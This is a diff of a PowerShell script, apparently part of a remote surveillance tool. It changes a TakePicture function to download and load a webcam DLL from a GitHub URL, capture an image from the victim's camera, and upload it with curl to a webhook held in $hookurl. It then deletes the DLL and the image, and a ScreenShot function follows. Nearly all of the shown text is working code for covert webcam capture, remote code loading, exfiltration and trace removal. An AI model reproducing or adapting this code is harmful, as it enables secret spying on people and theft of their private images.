@@ -822,29 +822,25 @@ Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Bo
 }
 
 Function TakePicture {
-$outputFolder = "$env:TEMP"
-$outputFile = "$env:TEMP\captured_image.jpg"
-$tempFolder = "$env:TEMP"
-$Path = "$env:Temp\ffmpeg.exe"
-If (!(Test-Path $Path)){  
-GetFfmpeg
+$dllPath = Join-Path -Path $env:TEMP -ChildPath "webcam.dll"
+if (-not (Test-Path $dllPath)) {
+    $url = "https://github.com/beigeworm/assets/raw/main/webcam.dll"
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($url, $dllPath)
 }
-$videoDevice = $null
-$videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Image' } | Select-Object -First 1
-if (-not $videoDevice) {
-    $videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Camera' } | Select-Object -First 1
-}
-if (-not $videoDevice) {
-    $videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Media' } | Select-Object -First 1
-}
-if ($videoDevice) {
-    $videoInput = $videoDevice.Name
-    $ffmpegPath = "$env:Temp\ffmpeg.exe"
-    & $ffmpegPath -f dshow -i video="$videoInput" -frames:v 1 $outputFile -y
+Add-Type -Path $dllPath
+[Webcam.webcam]::init()
+[Webcam.webcam]::select(1)
+$imageBytes = [Webcam.webcam]::GetImage()
+$tempDir = [System.IO.Path]::GetTempPath()
+$imagePath = Join-Path -Path $tempDir -ChildPath "webcam_image.jpg"
+[System.IO.File]::WriteAllBytes($imagePath, $imageBytes)
+Write-Host "Image captured and saved to: $imagePath"
     sleep 1
-    curl.exe -F "file1=@$outputFile" $hookurl | Out-Null
+    curl.exe -F "file1=@$imagePath" $hookurl | Out-Null
     sleep 1
-    Remove-Item -Path $outputFile -Force
+    Remove-Item -Path "$env:TEMP\webcam.dll"
+    Remove-Item -Path $imagePath -Force
 }
 
 Function ScreenShot {
